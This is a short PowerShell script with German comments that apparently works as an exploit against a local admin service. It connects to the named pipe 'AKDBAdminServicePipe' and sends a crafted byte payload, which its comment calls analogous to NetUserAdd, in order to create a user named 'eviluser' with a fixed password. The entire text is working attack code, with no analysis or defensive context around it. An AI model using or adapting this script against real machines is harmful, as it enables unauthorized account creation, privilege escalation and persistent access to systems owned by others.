$pipeName = "AKDBAdminServicePipe"
$server = "."

try {
    $pipe = New-Object System.IO.Pipes.NamedPipeClientStream($server, $pipeName, [System.IO.Pipes.PipeDirection]::InOut)
    $pipe.Connect(2000)

    if ($pipe.IsConnected) {
        Write-Host "[+] Verbunden mit Named Pipe!"

        # BinaryWriter vorbereiten
        $writer = New-Object System.IO.BinaryWriter($pipe)

        # Befehl "4" (NetUserAdd analog)
        $cmd = 0x34  # ASCII "4"

        # Nutzdaten vorbereiten
        $username = "eviluser" + [char]0
        $password = "P@ssw0rd123" + [char]0
        $flags = [BitConverter]::GetBytes(0x00000001)  # UF_SCRIPT

        # Byte-Array zusammenbauen
        $payload = New-Object System.Collections.Generic.List[Byte]
        $payload.Add($cmd)
        $payload.AddRange([System.Text.Encoding]::ASCII.GetBytes($username))
        $payload.AddRange([System.Text.Encoding]::ASCII.GetBytes($password))
        $payload.AddRange($flags)

        # Senden
        $writer.Write($payload.ToArray())
        $writer.Flush()

        Write-Host "[*] Daten gesendet. Warte auf Antwort ..."

        Start-Sleep -Milliseconds 500

        # Antwort lesen
        $reader = New-Object System.IO.BinaryReader($pipe)
        $response = $reader.ReadBytes(1024)

        if ($response.Length -gt 0) {
            Write-Host "[*] Antwort erhalten:"
            [System.Text.Encoding]::ASCII.GetString($response)
        } else {
            Write-Warning "Keine Antwort vom Dienst."
        }

        $reader.Close()
        $writer.Close()
        $pipe.Close()
    } else {
        Write-Host "[-] Verbindung zur Pipe fehlgeschlagen."
    }
} catch {
    Write-Host "[-] Fehler: $_"
}
